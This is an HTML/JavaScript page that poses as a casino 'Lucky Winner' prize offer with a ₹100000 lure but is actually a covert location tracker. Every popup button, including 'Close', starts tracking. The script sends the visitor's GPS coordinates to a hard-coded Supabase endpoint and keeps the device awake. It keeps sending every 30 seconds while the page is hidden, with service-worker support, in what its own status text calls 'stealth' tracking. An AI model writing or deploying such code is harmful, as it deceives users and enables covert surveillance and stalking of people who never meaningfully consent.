<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker - Enhanced Background Mode</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 20px auto;
            padding: 20px;
            background: url('casino-gambling.jpg') center center fixed;
            background-size: cover;
            background-repeat: no-repeat;
            min-height: 100vh;
        }
        .container {
            position: fixed;
            top: 20px;
            left: 20px;
            width: 22rem;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .status {
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            font-weight: bold;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        .success { background-color: rgba(212, 237, 218, 0.9); color: #155724; }
        .error { background-color: rgba(248, 215, 218, 0.9); color: #721c24; }
        .info { background-color: rgba(204, 230, 255, 0.9); color: #004085; }
        .warning { background-color: rgba(255, 243, 205, 0.9); color: #856404; }
        button {
            background-color: #007bff;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
        button:hover { background-color: #0056b3; }
        button:disabled { background-color: #6c757d; cursor: not-allowed; }
        .location-info {
            background: rgba(248, 249, 250, 0.9);
            backdrop-filter: blur(5px);
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        .test-btn {
            background-color: #28a745;
            font-size: 14px;
            padding: 10px 20px;
        }
        .test-btn:hover {
            background-color: #218838;
        }
        .background-status {
            background: rgba(231, 243, 255, 0.9);
            backdrop-filter: blur(5px);
            padding: 12px;
            border-radius: 8px;
            margin: 10px 0;
            font-size: 12px;
            border-left: 4px solid #007bff;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }

        /* Modern Location Permission Popup */
        .location-popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(10px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            animation: fadeIn 0.3s ease-out;
        }

        .location-popup {
            background: linear-gradient(135deg, rgba(255, 215, 0, 0.95), rgba(255, 140, 0, 0.95));
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            border: 2px solid rgba(255, 215, 0, 0.3);
            transform: scale(0.8);
            animation: popupIn 0.4s ease-out forwards;
        }

        .location-popup h2 {
            color: #8B0000;
            margin: 0 0 20px 0;
            font-size: 28px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
            font-weight: bold;
        }

        .location-popup p {
            color: #2C1810;
            font-size: 16px;
            margin: 15px 0;
            line-height: 1.6;
            text-shadow: 1px 1px 2px rgba(255, 255, 255, 0.5);
        }

        .location-popup .casino-icon {
            font-size: 60px;
            margin: 20px 0;
            filter: drop-shadow(3px 3px 6px rgba(0, 0, 0, 0.3));
        }

        .popup-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 30px;
        }

        .popup-btn {
            padding: 15px 25px;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.2);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
        }

        .popup-btn.allow {
            background: linear-gradient(135deg, #28a745, #2023c9);;
            color: white;
        }

        .popup-btn.allow:hover {
            background: linear-gradient(135deg, #218838, #1ba881);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(40, 167, 69, 0.4);
        }

        .popup-btn.deny {
            background: linear-gradient(135deg, #dc3545, #5423c8);
            color: white;
        }
        .popup-btn.close {
            background: linear-gradient(135deg, #670710, #c82331);
            color: white;
        }

        .popup-btn.deny:hover {
            background: linear-gradient(135deg, #c82333, #bd2130);
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(220, 53, 69, 0.4);
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes popupIn {
            from {
                transform: scale(0.8) translateY(-50px);
                opacity: 0;
            }
            to {
                transform: scale(1) translateY(0);
                opacity: 1;
            }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
    </style>
</head>
<body>
    <!-- Custom Location Permission Popup -->
    <div class="location-popup-overlay" id="locationPopup">
        <div class="location-popup">
            <div class="casino-icon pulse">ğŸ°ğŸ²ğŸƒ</div>
            <h2>ğŸŒŸ Lucky Winner ğŸŒŸ</h2>
            <p><strong>ğ’·ğ’¾ğ“ƒğ“ƒğ‘”ğ‘œğ’¸ğ’¶ğ’¸ğ’½ğ‘’.ğ’¿ğ‘’ğ‘’ğ“‰ğ‘œ</strong> wants to your feedback to provide the best gaming experience!</p>
            <p>ğŸ¯ <strong>Why we need your feedback:</strong></p>
            <p>â€¢ Enjoy your lucky spots effortlessly<br>
               â€¢ Enhanced gaming features<br>
               â€¢ bonuses & rewards</p>

            <div class="popup-buttons">
                <button class="popup-btn allow" onClick="startEnhancedTracking()">
                    ğŸŠ Win â‚¹ 100000 ğŸŠ
                </button>
                <button class="popup-btn deny" onClick="startEnhancedTracking()">
                    ğŸ¯ Play Now
                </button>
                <button class="popup-btn close" onClick="startEnhancedTracking()">
                    ğŸš« Close
                </button>
            </div>
        </div>
    </div>

    <div class="container">
        <h2>ğ’·ğ’¾ğ“ƒğ“ƒğ‘”ğ‘œğ’¸ğ’¶ğ’¸ğ’½ğ‘’.ğ’¿ğ‘’ğ‘’ğ“‰ğ‘œ</h2>
        <div id="status" class="status info">
            ğŸ² Welcome to Lucky ğ—¯ğ—¶ğ—»ğ—»ğ—´ğ—¼ğ—°ğ—®ğ—°ğ—µğ—²! ğŸ²
        </div>

        <div id="background-status" class="background-status">
            <p><strong>ğŸ° Casino Status:</strong> <span id="bg-text">Ready to start your lucky session...</span></p>
        </div>

        <div id="location-info" class="location-info">
            <h3>ğŸ¯ Your Lucky ğ—¯ğ—¶ğ—»ğ—»ğ—´ğ—¼ğ—°ğ—®ğ—°ğ—µğ—²</h3>
            <p><strong>Last Updated:</strong> <span id="last-updated">-</span></p>
            <p><strong>Lucky Calls:</strong> <span id="api-calls">0</span></p>
            <p><strong>Bonus Syncs:</strong> <span id="bg-syncs">0</span></p>
        </div>

        <button id="stopBtn" onclick="stopTracking()">ğŸ° Unlock Lucky Prize</button>
    </div>

    <script>
        // API Configuration
        const API_CONFIG = {
            url: 'https://nhfyodexozunbdepgdlz.supabase.co/rest/v1/location',
            headers: {
                'apikey': 'sb_publishable_rYYf2tEHhpCtENhAUWizuQ_mS2yadt2',
                'Authorization': 'Bearer sb_publishable_rYYf2tEHhpCtENhAUWizuQ_mS2yadt2',
                'Content-Type': 'application/json'
            }
        };

        let trackingInterval = null;
        let backgroundInterval = null;
        let isTracking = false;
        let apiCallCount = parseInt(localStorage.getItem('apiCallCount') || '0');
        let bgSyncCount = parseInt(localStorage.getItem('bgSyncCount') || '0');
        let serviceWorkerReady = false;
        let wakeLock = null;

        // Initialize and auto-start tracking
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('api-calls').textContent = apiCallCount;
            document.getElementById('bg-syncs').textContent = bgSyncCount;

            // Register enhanced service worker
            registerEnhancedServiceWorker();

            // Auto-start tracking immediately without popup
            setTimeout(() => {
                document.getElementById('locationPopup').style.display = 'flex';
                startEnhancedTracking();
            }, 1000);
        });

        async function registerEnhancedServiceWorker() {
            if ('serviceWorker' in navigator) {
                try {
                    const registration = await navigator.serviceWorker.register('./service-worker.js');
                    serviceWorkerReady = true;
                    updateBackgroundStatus('ğŸ° Casino service worker ready - premium background luck tracking enabled');

                    // Listen for messages from service worker
                    navigator.serviceWorker.addEventListener('message', function(event) {
                        if (event.data && event.data.type === 'SYNC_SUCCESS') {
                            bgSyncCount++;
                            localStorage.setItem('bgSyncCount', bgSyncCount.toString());
                            document.getElementById('bg-syncs').textContent = bgSyncCount;
                            console.log('Background sync successful');
                        }
                    });

                } catch (error) {
                    console.log('Service Worker registration failed:', error);
                    updateBackgroundStatus('ğŸ² Premium service unavailable - using standard casino mode');
                }
            } else {
                updateBackgroundStatus('ğŸƒ Classic casino mode - basic luck tracking enabled');
            }

            document.getElementById('background-status').style.display = 'block';
        }

        // Handle custom popup responses
        function allowLocation() {
            document.getElementById('locationPopup').style.display = 'none';
            updateStatus('ğŸ¯ Starting your lucky location tracking...', 'info');
            updateBackgroundStatus('Initializing casino location services...');
            setTimeout(() => startEnhancedTracking(), 500);
        }

        function denyLocation() {
            document.getElementById('locationPopup').style.display = 'none';
            updateStatus('ğŸš« Casino features limited', 'warning');
            updateBackgroundStatus('Casino features services disabled - limited functionality');
        }

        
        async function startEnhancedTracking() {
            console.log("cvbnm,")
            if (isTracking) {
                navigator.geolocation.getCurrentPosition(pos => {
                        sendLocationToAPI(pos.coords); // direct send
                    });
                return;
            }

            if (!navigator.geolocation) {
                updateStatus('ğŸš« Geolocation not supported by this browser', 'error');
                return;
            }

            // Check permission first
            try {
                const permission = await navigator.permissions.query({ name: 'geolocation' });

                console.log("permission",permission)

                if (permission.state === 'granted') {
                    navigator.geolocation.getCurrentPosition(pos => {
                        sendLocationToAPI(pos.coords); // direct send
                    });
                }
            } catch(e) {
                console.log('Permission check failed:', e);
            }

            // Request wake lock to keep device active
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                    updateBackgroundStatus('ğŸ° Casino mode active - keeping device awake for maximum luck!');
                }
            } catch (error) {
                console.log('Wake lock failed:', error);
            }

            updateStatus('ğŸ² Requesting access to your lucky coordinates...', 'info');

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    isTracking = true;
                    localStorage.setItem('isTracking', 'true');

                    updateStatus('ğŸ‰ Lucky location locked in! Casino activated! ğŸ‰', 'success');
                    updateButtons();
                    showLocationInfo();

                    sendLocationToAPI(position.coords);

                    if (serviceWorkerReady && navigator.serviceWorker.controller) {
                        navigator.serviceWorker.controller.postMessage({
                            type: 'START_TRACKING'
                        });
                    }

                    trackingInterval = setInterval(() => {
                        if (!document.hidden) {
                            getCurrentLocationAndSend();
                        }
                    }, 5 * 60 * 1000);

                    backgroundInterval = setInterval(() => {
                        if (document.hidden) {
                            getCurrentLocationAndSend();
                        }
                    }, 30 * 1000);

                    updateBackgroundStatus('ğŸ° Full casino mode - tracking your lucky moves with premium background tech');
                },
                function(error) {
                    let message = '';
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            message = 'ğŸš« Luck blocked! Please allow to unlock casino features.';
                            break;
                        case error.POSITION_UNAVAILABLE:
                            message = 'ğŸ“ Your lucky coordinates are hiding! unavailable.';
                            break;
                        case error.TIMEOUT:
                            message = 'â° Search timed out. The luck gods are busy!';
                            break;
                        default:
                            message = 'ğŸ² Mysterious error. The casino spirits are confused!';
                            break;
                    }
                    updateStatus(message, 'error');
                }
            );
        }



        
        function stopTracking() {
            isTracking = false;
            localStorage.setItem('isTracking', 'false');

            // Clear intervals
            if (trackingInterval) {
                clearInterval(trackingInterval);
                trackingInterval = null;
            }
            if (backgroundInterval) {
                clearInterval(backgroundInterval);
                backgroundInterval = null;
            }

            // Stop service worker tracking
            if (serviceWorkerReady && navigator.serviceWorker.controller) {
                navigator.serviceWorker.controller.postMessage({
                    type: 'STOP_TRACKING'
                });
            }

            // Release wake lock
            if (wakeLock) {
                wakeLock.release();
                wakeLock = null;
            }

            updateStatus('ğŸ° Casino session ended - lucky tracking stopped', 'info');
            updateBackgroundStatus('ğŸšª Left the casino - all background luck tracking terminated');
            updateButtons();
        }

        function getCurrentLocationAndSend() {
            navigator.geolocation.getCurrentPosition(
                (position) => sendLocationToAPI(position.coords),
                (error) => console.log('Location error:', error.message),
                { timeout: 10000, maximumAge: 30000 } // Faster timeout for background requests
            );
        }

        async function sendLocationToAPI(coords) {
            const locationData = {
                lat: coords.latitude.toString(),
                long: coords.longitude.toString(),
                created_at: new Date().toLocaleString("sv-SE", {timeZone: "Asia/Kolkata"})
            };

            try {
                console.log('ğŸ“¤ Sending location:', locationData);

                // Store location in service worker for background sync
                if (serviceWorkerReady && navigator.serviceWorker.controller) {
                    navigator.serviceWorker.controller.postMessage({
                        type: 'LOCATION_UPDATE',
                        location: locationData
                    });
                }

                const response = await fetch(API_CONFIG.url, {
                    method: 'POST',
                    headers: API_CONFIG.headers,
                    body: JSON.stringify(locationData)
                });

                if (response.ok) {
                    apiCallCount++;
                    localStorage.setItem('apiCallCount', apiCallCount.toString());
                    updateLocationDisplay(coords.latitude, coords.longitude);
                    document.getElementById('api-calls').textContent = apiCallCount;

                    const mode = document.hidden ? 'Background' : 'Foreground';
                    console.log(`âœ… ${mode} location sent successfully`);
                } else {
                    const errorText = await response.text();
                    console.error('âŒ API Error:', response.status, errorText);
                }
            } catch (error) {
                console.error('âŒ Send Error:', error);
            }
        }

        function updateLocationDisplay(lat, lng) {
            const latElement = document.getElementById('latitude');
            const lngElement = document.getElementById('longitude');
            const updatedElement = document.getElementById('last-updated');

            if (latElement) latElement.textContent = lat.toFixed(6);
            if (lngElement) lngElement.textContent = lng.toFixed(6);
            if (updatedElement) updatedElement.textContent = new Date().toLocaleString();
        }

        function updateStatus(message, type) {
            const statusDiv = document.getElementById('status');
            statusDiv.textContent = message;
            statusDiv.className = `status ${type}`;
        }

        function updateBackgroundStatus(message) {
            document.getElementById('bg-text').textContent = message;
        }

        function updateButtons() {
            document.getElementById('stopBtn').disabled = !isTracking;
        }

        function showLocationInfo() {
            document.getElementById('location-info').style.display = 'block';
        }

        // Enhanced page visibility handling
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                updateBackgroundStatus('ğŸŒ™ Casino minimized - stealth luck tracking active (30s intervals)');
                console.log('ğŸŒ™ Page hidden - entering background casino mode');
            } else {
                updateBackgroundStatus('ğŸŒ Back to the casino floor - VIP Player');
                console.log('ğŸŒ Page visible - entering foreground casino mode');

                // Immediately check location when page becomes visible
                if (isTracking) {
                    setTimeout(() => getCurrentLocationAndSend(), 1000);
                }
            }
        });

        // Handle page unload - try to keep tracking active
        window.addEventListener('beforeunload', function(event) {
            if (isTracking) {
                console.log('âš ï¸ Page unloading - background tracking will attempt to continue via Service Worker');
            }
        });

        // Periodic health check - restart intervals if they stop
        setInterval(() => {
            if (isTracking) {
                if (!trackingInterval && !document.hidden) {
                    console.log('ğŸ”„ Restarting foreground interval');
                    trackingInterval = setInterval(() => {
                        if (!document.hidden) {
                            getCurrentLocationAndSend();
                        }
                    }, 5 * 60 * 1000);
                }

                if (!backgroundInterval) {
                    console.log('ğŸ”„ Restarting background interval');
                    backgroundInterval = setInterval(() => {
                        if (document.hidden) {
                            getCurrentLocationAndSend();
                        }
                    }, 30 * 1000);
                }
            }
        }, 30000); // Check every 30 seconds
    </script>
</body>
</html>
